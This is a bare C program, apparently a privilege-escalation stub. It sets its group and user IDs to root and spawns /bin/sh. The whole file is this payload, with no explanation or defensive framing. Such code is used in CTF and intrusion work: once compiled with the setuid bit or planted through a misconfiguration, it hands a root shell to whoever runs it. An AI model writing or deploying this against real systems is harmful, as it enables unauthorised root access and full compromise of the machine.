#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
